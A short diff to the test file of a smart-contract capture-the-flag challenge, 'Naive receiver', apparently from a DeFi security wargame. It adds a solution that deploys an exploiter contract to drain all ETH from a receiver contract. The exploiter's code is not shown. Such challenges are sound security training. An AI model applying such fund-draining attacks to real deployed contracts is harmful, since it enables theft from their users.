@@ -31,11 +31,12 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        const AttackedContractFactory = await ethers.getContractFactory('NaiveReceiverExploiter');
+        await AttackedContractFactory.deploy(this.receiver.address, this.pool.address);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-
         // All ETH has been drained from the receiver
         expect(
             await ethers.provider.getBalance(this.receiver.address)
